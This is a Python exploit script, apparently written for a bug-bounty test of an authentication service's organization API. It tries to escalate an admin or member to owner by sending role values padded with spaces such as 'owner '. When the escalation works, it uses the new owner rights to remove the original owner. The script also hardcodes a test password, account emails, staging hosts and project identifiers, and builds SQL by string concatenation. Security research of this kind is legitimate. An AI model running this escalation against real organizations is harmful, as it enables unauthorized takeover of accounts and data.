# -*- coding: utf-8 -*-
"""V10: THE critical combo - does update-member-role permission check use the RAW
role string while storing TRIMMED? If admin passes role='owner ' (raw != 'owner'
-> no owner-required gate), stored as 'owner' (trim) -> ADMIN->OWNER ESCALATION.
Matrix: admin self-upgrade; member self-upgrade; member updates other; admin
updates other admin; all with 'owner ' / ' admin' / exact 'owner' control."""
import json, ssl, time, http.client

NA_HOST = "ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build"
API_HOST = "console-stage.neon.build"
API_BASE = "/api/v2"
PA = "orange-sun-90493739"
PAMAIN = "br-wandering-field-w2ob6mpn"
with open(r"F:\scan\neon_report\_apikey.json", encoding="utf-8") as fh:
    APIKEY = json.load(fh)["key"]
ctx = ssl.create_default_context()
DB_URI = None
PASS = "SecTest!2026pass"
U1 = "libobo1229+na_org1@gmail.com"
U2 = "libobo1229+na_org2@gmail.com"
U3 = "libobo1229+na_org3@gmail.com"


def out(s):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), s), flush=True)


def na(method, path, body=None, cookie=None, timeout=30):
    try:
        conn = http.client.HTTPSConnection(NA_HOST, timeout=timeout, context=ctx)
        payload = json.dumps(body) if body is not None else None
        hdrs = {"Content-Type": "application/json", "Origin": "http://localhost:3000",
                "User-Agent": "Mozilla/5.0", "Accept": "application/json",
                "X-Bug-Bounty": "xxbo"}
        if cookie:
            hdrs["Cookie"] = cookie
        conn.request(method, path, body=payload, headers=hdrs)
        resp = conn.getresponse()
        data = resp.read().decode("utf-8", "replace")
        ck = resp.getheader("Set-Cookie", "")
        conn.close()
        time.sleep(0.5)
        return resp.status, data, ck
    except Exception as e:
        time.sleep(0.5)
        return None, str(e)[:150], ""


def auth(email):
    st, data, ck = na("POST", "/neondb/auth/sign-in/email",
                      {"email": email, "password": PASS})
    return ck.split(";")[0] if st in (200, 201) else None


def fetch_db_uri():
    global DB_URI
    conn = http.client.HTTPSConnection(API_HOST, timeout=30, context=ctx)
    conn.request("GET", API_BASE + "/projects/%s/connection_uri?database_name=neondb"
                 "&role_name=neondb_owner&branch_id=%s" % (PA, PAMAIN),
                 headers={"X-Bug-Bounty": "xxbo", "Authorization": "Bearer " + APIKEY})
    resp = conn.getresponse()
    data = json.loads(resp.read().decode("utf-8", "replace"))
    conn.close()
    uri = data.get("uri")
    from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
    parts = urlsplit(uri)
    q = [(k, v) for k, v in parse_qsl(parts.query) if k != "channel_binding"]
    DB_URI = urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(q), parts.fragment))


def dbq(sql):
    import psycopg
    with psycopg.connect(DB_URI, connect_timeout=15) as conn:
        conn.autocommit = True
        with conn.cursor() as cur:
            cur.execute(sql)
            if cur.description is None:
                return None
            return cur.fetchall()


def role_of(org, email):
    r = dbq('SELECT m.role FROM neon_auth.member m JOIN neon_auth.user u ON u.id=m."userId" '
            'WHERE m."organizationId"=%s AND u.email=%s' % ("'" + org + "'", "'" + email + "'"))
    return r[0][0] if r else None


def mid_of(org, email):
    r = dbq('SELECT m.id FROM neon_auth.member m JOIN neon_auth.user u ON u.id=m."userId" '
            'WHERE m."organizationId"=%s AND u.email=%s' % ("'" + org + "'", "'" + email + "'"))
    return str(r[0][0]) if r else None


def join(org, email, role, ck_owner, ck_user, tag):
    st, d, _ = na("POST", "/neondb/auth/organization/invite-member",
                  {"organizationId": org, "email": email, "role": role}, ck_owner)
    if st != 200:
        out("%s invite failed %d" % (tag, st))
        return None
    r = dbq('SELECT id FROM neon_auth.invitation WHERE "organizationId"=%s AND email=%s '
            'AND status=%s' % ("'" + org + "'", "'" + email + "'", "'pending'"))
    iid = str(r[0][0]) if r else None
    if iid:
        st, d, _ = na("POST", "/neondb/auth/organization/accept-invitation",
                      {"invitationId": iid}, ck_user)
        out("%s joined as %s -> %d" % (tag, role, st))
    return iid


def upd(org, mid, role, ck, tag):
    st, d, _ = na("POST", "/neondb/auth/organization/update-member-role",
                  {"organizationId": org, "memberId": mid, "role": role}, ck)
    out("%-46s -> %d %s" % (tag, st, d[:130]))
    return st


def main():
    out("== V10 update-role trim escalation combo ==")
    fetch_db_uri()
    c1, c2, c3 = auth(U1), auth(U2), auth(U3)
    out("sessions: %s" % [bool(c1), bool(c2), bool(c3)])
    if not all([c1, c2, c3]):
        return
    st, d, _ = na("POST", "/neondb/auth/organization/create",
                  {"name": "v10-org", "slug": "v10-%d" % int(time.time())}, c1)
    org = json.loads(d).get("id") if st == 200 else None
    out("org=%s" % org)
    if not org:
        return
    join(org, U2, "admin", c1, c2, "U2")
    join(org, U3, "member", c1, c3, "U3")
    m2, m3, m1 = mid_of(org, U2), mid_of(org, U3), mid_of(org, U1)

    # E1: admin U2 self-upgrade with 'owner ' (the combo)
    upd(org, m2, "owner ", c2, "E1 admin SELF 'owner '")
    out("   U2 role now: %r" % role_of(org, U2))
    # if U2 is owner -> verify owner power (remove U1)
    if role_of(org, U2) == "owner":
        out("   !!! ESCALATED - verifying remove U1")
        st, d, _ = na("POST", "/neondb/auth/organization/remove-member",
                      {"organizationId": org, "memberIdOrEmail": m1}, c2)
        out("   U2 removes U1 -> %d %s" % (st, d[:120]))
        out("   members: %s" % [(x[0], repr(x[1])) for x in dbq(
            'SELECT u.email, m.role FROM neon_auth.member m JOIN neon_auth.user u '
            'ON u.id=m."userId" WHERE m."organizationId"=%s' % ("'" + org + "'"))])
    else:
        # E1b: admin self with exact 'owner' (control - should 403)
        upd(org, m2, "owner", c2, "E1b admin SELF 'owner' ctrl")
        out("   U2 role now: %r" % role_of(org, U2))
        # E1c: admin self with ' owner' (leading space)
        upd(org, m2, " owner", c2, "E1c admin SELF ' owner'")
        out("   U2 role now: %r" % role_of(org, U2))
        # E1d: admin self with 'admin ' (already admin, harmless?)
        upd(org, m2, "admin ", c2, "E1d admin SELF 'admin '")
        out("   U2 role now: %r" % role_of(org, U2))

    # E2: member U3 self-upgrade 'owner ' / exact owner
    upd(org, m3, "owner ", c3, "E2 member SELF 'owner '")
    out("   U3 role now: %r" % role_of(org, U3))
    upd(org, m3, "owner", c3, "E2b member SELF 'owner' ctrl")
    out("   U3 role now: %r" % role_of(org, U3))

    # E3: member U3 tries updating U2 (other member)
    upd(org, m2, "member", c3, "E3 member U3->U2 'member'")
    # E4: admin U2 updates U3 (other member) to 'owner ' / admin
    upd(org, m3, "owner ", c2, "E4 admin U2->U3 'owner '")
    out("   U3 role now: %r" % role_of(org, U3))
    upd(org, m3, "admin", c2, "E4b admin U2->U3 'admin'")
    out("   U3 role now: %r" % role_of(org, U3))

    # final members
    out("   FINAL members: %s" % [(x[0], repr(x[1])) for x in dbq(
        'SELECT u.email, m.role FROM neon_auth.member m JOIN neon_auth.user u '
        'ON u.id=m."userId" WHERE m."organizationId"=%s' % ("'" + org + "'"))])
    # cleanup: owner deletes
    rem = dbq('SELECT u.email FROM neon_auth.member m JOIN neon_auth.user u ON u.id=m."userId" '
              'WHERE m."organizationId"=%s AND m.role=\'owner\'' % ("'" + org + "'"))
    ck_owner = c1
    if rem and rem[0][0] == U2:
        ck_owner = c2
    elif rem and rem[0][0] == U3:
        ck_owner = c3
    st, d, _ = na("POST", "/neondb/auth/organization/delete", {"organizationId": org}, ck_owner)
    out("cleanup delete org -> %d" % st)
    dbq('DELETE FROM neon_auth.invitation WHERE "organizationId"=%s' % ("'" + org + "'"))
    out("done")


if __name__ == "__main__":
    main()
